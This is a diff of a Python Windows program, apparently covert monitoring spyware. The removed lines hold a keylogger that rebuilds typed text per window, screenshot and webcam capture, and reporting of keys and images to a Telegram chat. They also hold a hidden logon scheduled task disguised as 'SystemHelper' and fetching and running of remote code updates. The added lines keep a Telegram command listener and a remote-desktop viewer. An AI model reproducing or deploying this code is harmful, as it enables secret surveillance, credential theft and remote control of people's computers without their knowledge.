-        0x5B, 0x5C, 0x5D, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5,
-    ):
-        return ""
-    if 0x41 <= vk <= 0x5A:
-        ch = chr(vk)
-        if is_ctrl_down():
-            return "[CTRL+{}]".format(ch)
-        return ch if is_upper_letter() else ch.lower()
-    if 0x30 <= vk <= 0x39:
-        return ")!@#$%^&*("[vk - 0x30] if is_shift_down() else chr(vk)
-    if 0x60 <= vk <= 0x69:
-        return str(vk - 0x60)
-    if vk == 0x6A:
-        return "*"
-    if vk == 0x6B:
-        return "+"
-    if vk == 0x6D:
-        return "-"
-    if vk == 0x6E:
-        return "."
-    if vk == 0x6F:
-        return "/"
-    if vk == 0xBA:
-        return ":" if is_shift_down() else ";"
-    if vk == 0xBB:
-        return "+" if is_shift_down() else "="
-    if vk == 0xBC:
-        return "<" if is_shift_down() else ","
-    if vk == 0xBD:
-        return "_" if is_shift_down() else "-"
-    if vk == 0xBE:
-        return ">" if is_shift_down() else "."
-    if vk == 0xBF:
-        return "?" if is_shift_down() else "/"
-    if vk == 0xC0:
-        return "~" if is_shift_down() else "`"
-    if vk == 0xDB:
-        return "{" if is_shift_down() else "["
-    if vk == 0xDC:
-        return "|" if is_shift_down() else "\\"
-    if vk == 0xDD:
-        return "}" if is_shift_down() else "]"
-    if vk == 0xDE:
-        return '"' if is_shift_down() else "'"
-    return ""
-
-
-def is_shift_down():
-    try:
-        return bool(user32.GetKeyState(0x10) & 0x8000)
-    except Exception:
-        return False
-
-
-def is_caps_down():
-    try:
-        return bool(user32.GetKeyState(0x14) & 0x0001)
-    except Exception:
-        return False
-
-
-def is_ctrl_down():
-    try:
-        return bool(
-            (user32.GetKeyState(0x11) & 0x8000)
-            or (user32.GetKeyState(0xA2) & 0x8000)
-            or (user32.GetKeyState(0xA3) & 0x8000)
-        )
-    except Exception:
-        return False
-
-
-def is_upper_letter():
-    return is_shift_down() ^ is_caps_down()
-
-
-def on_key(vk, scan):
-    try:
-        text = key_to_text(vk, scan)
-        if not text:
-            return
-    except Exception:
-        return
-    with window_lock:
-        win = current_window["title"]
-    with key_lock:
-        key_buffer.append(
-            {
-                "time": now().strftime("%H:%M:%S"),
-                "win": win,
-                "text": text,
-            }
-        )
-
-
-def reconstruct_text(key_texts):
-    buf = []
-    select_all = False
-    clipboard = ""
-
-    for text in key_texts:
-        if text == "[CTRL+A]":
-            select_all = True
-            continue
-        elif text == "[CTRL+C]":
-            clipboard = "".join(buf)
-            select_all = False
-            continue
-        elif text == "[CTRL+V]":
-            if select_all:
-                buf.clear()
-                select_all = False
-            buf.extend(list(clipboard))
-            continue
-        elif text == "[CTRL+X]":
-            clipboard = "".join(buf)
-            buf.clear()
-            select_all = False
-            continue
-        elif text == "[CTRL+BACKSPACE]":
-            if select_all:
-                buf.clear()
-                select_all = False
-            else:
-                while buf and buf[-1] == " ":
-                    buf.pop()
-                while buf and buf[-1] != " ":
-                    buf.pop()
-            continue
-
-        if select_all:
-            if text == "[BACKSPACE]":
-                buf.clear()
-                select_all = False
-                continue
-            elif not (text.startswith("[") and text.endswith("]")):
-                buf.clear()
-                select_all = False
-
-        select_all = False
-
-        if text == "[BACKSPACE]":
-            if buf:
-                buf.pop()
-        elif text == "[TAB]":
-            buf.append(" [TAB] ")
-        elif text.startswith("[ENTER]"):
-            buf.append(" [ENTER] ")
-        elif text == " ":
-            buf.append(" ")
-        elif text.startswith("[CTRL+"):
-            buf.append(" {} ".format(text))
-        elif text.startswith("[") and text.endswith("]"):
-            buf.append(" {} ".format(text))
-        else:
-            buf.append(text)
-
-    result = "".join(buf)
-    if len(result) > 400:
-        result = result[:400] + "..."
-    return result
-
-
-def reconstruct_by_window(keys):
-    if not keys:
-        return []
-    groups = []
-    current_win = None
-    current_keys = []
-    for k in keys:
-        if isinstance(k, dict):
-            win = k.get("win", "")
-            text = k.get("text", "")
-        else:
-            parts = str(k).split(" | ", 2)
-            win = parts[1] if len(parts) >= 3 else ""
-            text = parts[2] if len(parts) >= 3 else str(k)
-
-        if win != current_win:
-            if current_keys:
-                txt = reconstruct_text(current_keys)
-                if txt:
-                    groups.append((current_win, txt))
-            current_win = win
-            current_keys = [text]
-        else:
-            current_keys.append(text)
-    if current_keys:
-        txt = reconstruct_text(current_keys)
-        if txt:
-            groups.append((current_win, txt))
-    return groups
-
-
-_hook = None
-_callback = None
-
-
-def keylog_thread():
-    prev = set()
-    while True:
-        try:
-            if paused.is_set():
-                prev = set()
-                time.sleep(0.5)
-                continue
-            down = set()
-            for vk in range(0x08, 0xFF):
-                if user32.GetAsyncKeyState(vk) & 0x8000:
-                    down.add(vk)
-            newly_pressed = down - prev
-            for vk in newly_pressed:
-                on_key(vk, 0)
-            prev = down
-        except Exception:
-            pass
-        time.sleep(0.02)
-
-
-def take_screenshot():
-    try:
-        import mss
-    except Exception:
-        return None
-    try:
-        shots = Path(cfg["log_dir"]) / "screenshots"
-        shots.mkdir(parents=True, exist_ok=True)
-        path = shots / (now().strftime("%Y-%m-%d_%H-%M-%S") + ".png")
-        with mss.mss() as sct:
-            sct.shot(output=str(path))
-        return str(path)
-    except Exception:
-        return None
-
-
-def capture_camera():
-    try:
-        import cv2
-    except Exception:
-        return None
-    try:
-        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
-        if not cap.isOpened():
-            cap = cv2.VideoCapture(0)
-        if not cap.isOpened():
-            return None
-        ret, frame = cap.read()
-        cap.release()
-        if not ret or frame is None:
-            return None
-        shots = Path(cfg["log_dir"]) / "camera"
-        shots.mkdir(parents=True, exist_ok=True)
-        path = shots / (now().strftime("%Y-%m-%d_%H-%M-%S") + ".jpg")
-        cv2.imwrite(str(path), frame)
-        return str(path)
-    except Exception:
-        return None
-
-
-def do_camera_shot():
-    p = capture_camera()
-    if p:
-        send_telegram_photo(
-            p,
-            "Camera {} {}".format(MACHINE_NAME, now().strftime("%H:%M")),
-            filename="camera.jpg",
-            ctype="image/jpeg",
-        )
-    else:
-        send_telegram_text("[{}] Khong chup duoc camera (khong co webcam?)".format(MACHINE_NAME))
-
-
-def screenshot_thread():
-    while True:
-        time.sleep(cfg.get("screenshot_interval_seconds", 600))
-        if paused.is_set():
-            continue
-        if not cfg.get("screenshot_enabled", True):
-            continue
-        p = take_screenshot()
-        if p:
-            log_line("system", "screenshot " + p)
-
-
-def camera_thread():
-    while True:
-        interval = cfg.get("camera_interval_seconds", 0)
-        if interval <= 0:
-            time.sleep(30)
-            continue
-        time.sleep(interval)
-        if paused.is_set():
-            continue
-        if not cfg.get("camera_enabled", False):
-            continue
-        p = capture_camera()
-        if p:
-            log_line("system", "camera " + p)
-            send_telegram_photo(
-                p,
-                "Camera {} {}".format(MACHINE_NAME, now().strftime("%H:%M")),
-                filename="camera.jpg",
-                ctype="image/jpeg",
-            )
-
-
-last_report = None
-
-
-def drain_keys():
-    with key_lock:
-        items = list(key_buffer)
-        key_buffer.clear()
-    return items
-
-
-def drain_sessions(since):
-    with window_lock:
-        picked = [s for s in sessions if s["start"] >= since]
-        sessions[:] = [s for s in sessions if s["start"] < since]
-    return picked
-
-
-def latest_screenshot():
-    shots = Path(cfg["log_dir"]) / "screenshots"
-    if not shots.exists():
-        return None
-    files = sorted(shots.glob("*.png"), key=lambda p: p.stat().st_mtime)
-    return str(files[-1]) if files else None
-
-
-def reporter_thread():
-    global last_report, start_time
-    last_report = now()
-    while True:
-        time.sleep(cfg.get("report_interval_seconds", 300))
-        if paused.is_set():
-            continue
-        since = last_report
-        last_report = now()
-        keys = drain_keys()
-        sess = drain_sessions(since)
-
-        lines = []
-        if sess:
-            lines.append("Apps:")
-            for s in sess[:30]:
-                secs = int((s["end"] - s["start"]).total_seconds())
-                lines.append(
-                    "  {} ({}m) {}".format(
-                        s["title"], secs // 60, s["start"].strftime("%H:%M")
-                    )
-                )
-        if keys:
-            lines.append("Keys:")
-            for k in keys[:80]:
-                if isinstance(k, dict):
-                    lines.append("  {} | {} | {}".format(k["time"], k["win"], k["text"]))
-                else:
-                    lines.append("  " + str(k))
-            if len(keys) > 80:
-                lines.append("  ... +{} keys".format(len(keys) - 80))
-
-            groups = reconstruct_by_window(keys)
-            if len(groups) == 1:
-                lines.append("-> Kết quả: {}".format(groups[0][1]))
-            elif len(groups) > 1:
-                lines.append("-> Kết quả:")
-                for w, t in groups:
-                    lines.append("  [{}]: {}".format(w, t))
-
-        uptime_min = int((now() - start_time).total_seconds() // 60)
-        header = "[{}] Report {} -> {} (up {}m)".format(
-            MACHINE_NAME, since.strftime("%H:%M"), now().strftime("%H:%M"),
-            uptime_min,
-        )
-        if not lines:
-            lines.append("  (no notable activity)")
-        message = header + "\n" + "\n".join(lines)
-        if len(message) > 3800:
-            message = message[:3800]
-        send_telegram_text(message)
-
-        if cfg.get("screenshot_enabled", True):
-            shot = latest_screenshot()
-            if shot:
-                send_telegram_photo(
-                    shot,
-                    "Screen {} {}".format(
-                        MACHINE_NAME, now().strftime("%H:%M")
-                    ),
-                )
-        log_line("system", "report sent")
-
-
-def startup_notice():
-    offline = ""
-    if STATUS_FILE.exists():
-        try:
-            data = json.loads(STATUS_FILE.read_text(encoding="utf-8"))
-            last_seen = datetime.datetime.fromisoformat(
-                data.get("last_seen", "")
-            )
-            gap = (now() - last_seen).total_seconds()
-            if gap > max(cfg["report_interval_seconds"] * 2, 600):
-                offline = "\n(PC was off since {})".format(
-                    last_seen.strftime("%Y-%m-%d %H:%M")
-                )
-        except Exception:
-            pass
-    STATUS_FILE.write_text(
-        json.dumps({"last_seen": now().isoformat()}), encoding="utf-8"
-    )
-    ok = send_telegram_text(
-        "[{}] PC ON at {}{}".format(
-        MACHINE_NAME, now().strftime("%Y-%m-%d %H:%M"), offline
-    )
-    )
-    try:
-        (BASE_DIR / "status.txt").write_text(
-            "{} | Telegram={} | Machine={}\n".format(
-                now().strftime("%Y-%m-%d %H:%M:%S"),
-                "OK" if ok else "FAIL",
-                MACHINE_NAME,
-            ),
-            encoding="utf-8",
-        )
-    except Exception:
-        pass
-
-
-def self_install():
-    marker = BASE_DIR / ".installed"
-    if marker.exists():
-        return
-    try:
-        exe = sys.executable if getattr(sys, "frozen", False) else str(
-            Path(__file__).resolve()
-        )
-        ps = (
-            "$a = New-ScheduledTaskAction -Execute '{0}'; "
-            "$t = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME; "
-            "Register-ScheduledTask -TaskName 'SystemHelper' -Action $a "
-            "-Trigger $t -Force | Out-Null"
-        ).format(exe)
-        result = subprocess.run(
-            ["powershell", "-NoProfile", "-Command", ps],
-            capture_output=True,
-        )
-        if result.returncode == 0:
-            log_line("system", "self-installed: schedule + hidden")
-        else:
-            log_line(
-                "errors",
-                "self_install rc={}: {}".format(
-                    result.returncode,
-                    (result.stderr or b"").decode("utf-8", "replace").strip(),
-                ),
-            )
-        subprocess.run(
-            "attrib +h {}\\SystemHelper.exe".format(BASE_DIR),
-            shell=True,
-            capture_output=True,
-        )
-        marker.write_text("ok", encoding="utf-8")
-    except Exception as e:
-        log_line("errors", "self_install: {}".format(e))
-
-
-def remote_update_cmd():
-    if fetch_remote_update():
-        send_telegram_text(
-            "[{}] Da tai phien ban moi, dang khoi dong lai...".format(MACHINE_NAME)
-        )
-        log_line("system", "restarting after remote update")
-        restart_process()
-    else:
-        version_file = RUNTIME_DIR / "current_version.txt"
-        if version_file.exists():
-            cur = version_file.read_text(encoding="utf-8").strip()
-            send_telegram_text(
-                "[{}] Khong co phien ban moi (dang o {}).".format(
-                    MACHINE_NAME, cur
-                )
-            )
-        else:
-            send_telegram_text(
-                "[{}] Khong tim thay phien ban moi (kiem tra update_url).".format(
-                    MACHINE_NAME
-                )
-            )
+                if data.get("ok"):
+                    for result in data.get("result", []):
+                        last_update_id = result.get("update_id", last_update_id)
+                        msg = result.get("message", {})
+                        chat_id = str(msg.get("chat", {}).get("id", ""))
+                        if chat_id == str(cfg.get("telegram_chat_id", "")):
+                            text = msg.get("text", "")
+                            if text:
+                                handle_command(text)
+        except Exception as e:
+            log_line("errors", f"command_listener: {e}")
+        time.sleep(3)
 
 
 def main():
     load_config()
     global start_time
     start_time = now()
-    if __name__ != "monitor_runtime":
-        if fetch_remote_update():
-            if run_runtime_code():
-                log_line("system", "running runtime code v"
-                         + (RUNTIME_DIR / "current_version.txt").read_text(
-                             encoding="utf-8"
-                         ).strip())
-                return
-    threading.Thread(target=window_poller, daemon=True).start()
-    if cfg.get("keylog_enabled", True):
-        threading.Thread(target=keylog_thread, daemon=True).start()
-    threading.Thread(target=screenshot_thread, daemon=True).start()
-    threading.Thread(target=camera_thread, daemon=True).start()
-    threading.Thread(target=reporter_thread, daemon=True).start()
+    start_embedded_viewer_server(port=8088)
     threading.Thread(target=command_listener, daemon=True).start()
-    if getattr(sys, "frozen", False):
-        threading.Thread(target=self_install, daemon=True).start()
-    threading.Thread(target=startup_notice, daemon=True).start()
-    log_line("system", "monitor started")
+    logger.info("Monitor started with WebRTC H.264 Remote Desktop Engine.")
     try:
         while True:
             time.sleep(60)
